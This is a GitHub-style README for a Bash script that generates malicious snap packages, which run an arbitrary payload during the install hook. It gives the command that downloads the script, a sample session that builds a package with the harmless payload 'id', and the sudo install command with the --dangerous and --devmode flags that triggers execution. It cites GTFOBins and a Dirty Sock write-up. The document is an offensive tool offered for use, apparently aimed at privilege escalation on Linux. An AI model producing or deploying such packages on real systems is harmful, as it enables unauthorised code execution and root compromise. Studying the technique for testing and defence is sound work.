# Snap_Generator
Quick Bash script to generate malicious snap packages. Commands are executed in the install hook runtime.

## Requirements
- [FPM](https://fpm.readthedocs.io/en/latest/installing.html)

## Installation/Usage
- Download/setup:
- 
`wget https://raw.githubusercontent.com/0xAsh/Snap_Generator/main/snap_generator.sh && chmod +x snap_generator.sh`

- Generate snap package:
```
$ ./snap_generator.sh 
Enter payload: 
id
Payload is set to: id 

Enter payload name: 
id


...Generating Payload...

Created package {:path=>"id_1.0_all.snap"}

```
- Run generated package:

`sudo snap install id_1.0_all.snap --dangerous --devmode`


## References:
- https://gtfobins.github.io/gtfobins/snap/
- https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html
